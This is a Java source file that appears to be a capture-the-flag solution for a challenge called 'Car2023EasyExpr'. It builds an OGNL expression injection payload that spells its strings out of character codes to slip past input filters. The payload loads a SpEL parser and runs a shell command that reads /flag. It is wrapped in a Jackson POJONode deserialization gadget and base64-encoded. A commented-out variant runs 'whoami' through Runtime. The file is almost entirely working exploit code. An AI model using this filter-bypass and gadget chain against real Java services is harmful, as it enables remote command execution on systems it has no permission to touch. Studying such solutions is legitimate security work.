package dev.silente.javashark.solution;


import com.ctf.expr.entity.User;
import com.fasterxml.jackson.databind.node.POJONode;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import ognl.Ognl;
import ognl.OgnlContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.util.Arrays;

public class Car2023EasyExpr {

    static String getChar(char ch) {
        return "(#" + (char)ch + " = new Character(" + (int)ch + ").toString())";
    }

    static String generateChar() {
        StringBuffer s = new StringBuffer();
        for (char pos = 'a'; pos <= 'z'; ++pos) {
            s.append(getChar(pos));
            s.append('.');
        }
        for (char pos = 'A'; pos <= 'Z'; ++pos) {
            s.append(getChar(pos));
            s.append('.');
        }

        for (char pos = '0'; pos <= '9'; ++pos) {
            s.append("(#num" + pos + " = new Character(" + (int)(pos) + ").toString())");
            s.append('.');
        }

        s.append("(#dot = new Character(" + (int)'.' + ").toString())");
        s.append('.');
        s.append("(#qquot = new Character(" + (int)'"' + ").toString())");
        s.append('.');
        s.append("(#quot = new Character(" + (int)'\'' + ").toString())");
        s.append('.');
        s.append("(#lq = new Character(" + (int)'(' + ").toString())");
        s.append('.');
        s.append("(#rq = new Character(" + (int)')' + ").toString())");
        s.append('.');
        s.append("(#lw = new Character(" + (int)'[' + ").toString())");
        s.append('.');
        s.append("(#rw = new Character(" + (int)']' + ").toString())");
        s.append('.');
        s.append("(#sb = new Character(" + (int)';' + ").toString())");
        s.append('.');
        s.append("(#eqq = new Character(" + (int)'=' + ").toString())");
        s.append('.');
        s.append("(#spaces = new Character(" + (int)' ' + ").toString())");
        s.append('.');
        s.append("(#lines = new Character(" + (int)'|' + ").toString())");
        s.append('.');
        s.append("(#neko = new Character(" + (int)'-' + ").toString())");
        s.append('.');
        s.append("(#ltt = new Character(" + (int)'{' + ").toString())");
        s.append('.');
        s.append("(#rtt = new Character(" + (int)'}' + ").toString())");
        s.append('.');
        s.append("(#plotst = new Character(" + (int)',' + ").toString())");
        s.append('.');
        s.append("(#rbq = new Character(" + (int)'/' + ").toString())");
        s.append('.');
        return s.toString();
    }

    static String makeString(String s) {
        StringBuffer make = new StringBuffer();
        char[] ss = s.toCharArray();
        for (char ch: ss) {
            if (ch == '.') {
                make.append("#dot+");
            }
            else if (ch == '\"') {
                make.append("#qquot+");
            }
            else if (ch == '\'') {
                make.append("#quot+");
            }
            else if (ch == '(') {
                make.append("#lq+");
            }
            else if (ch == ')') {
                make.append("#rq+");
            }
            else if (ch == '[') {
                make.append("#lw+");
            }
            else if (ch == ']') {
                make.append("#rw+");
            }
            else if (ch == ';') {
                make.append("#sb+");
            }
            else if (ch == '=') {
                make.append("#eqq+");
            }
            else if (ch == ' ') {
                make.append("#spaces+");
            }
            else if (ch == '|') {
                make.append("#lines+");
            }
            else if (ch == '-') {
                make.append("#neko+");
            }
            else if (ch == '{') {
                make.append("#ltt+");
            }
            else if (ch == '}') {
                make.append("#rtt+");
            }
            else if (ch == ',') {
                make.append("#plotst+");
            }
            else if (ch == '/') {
                make.append("#rbq+");
            }
            else if (ch <= '9' && ch >= '0') {
                make.append("#num" + ch + "+");
            }
            else {
                make.append("#").append(ch).append("+");
            }
        }
        return make.substring(0, make.length() - 1);
    }

    public static void main(String[] args) throws Exception {

        String spel = "new java.util.Scanner(new java.lang.ProcessBuilder(\"cat\", \"/flag\").start().getInputStream(), \"GBK\").useDelimiter(\"asfsfsdfsf\").next()";
        String expr = generateChar() +
                "(#el = #this.getClass().forName(" + makeString("org.springframework.expression.spel.standard.SpelExpressionParser") +").newInstance())." +
                "(#input = #el.parseExpression(" + makeString(spel) + ").getValue())";

//        String expr = generateChar() +
//                "(#runtime = #this.getClass().forName(" + makeString("java.lang.Runtime") +"))." +
//                "(#getMethod = #runtime.getMethods[6])." +
//                "(#runMethod = #runtime.getMethods[13])." +
//                "(#instine = #getMethod.invoke(null, null))." +
//                "(#result = #runMethod.invoke(#instine, " + makeString("whoami") + ").getInputStream())." +
//                "(#result.read())";


//        OgnlContext ognlContext = new OgnlContext();
//        System.out.println(Ognl.getValue(expr, ognlContext).toString());


        User user = new User("foo", "bar", expr);
        Object pojo = new POJONode(user);
        String code = MiscUtils.base64Encode(SerializeUtils.serialize(pojo));
        System.out.println(code);

        System.out.println(pojo);
    }
}
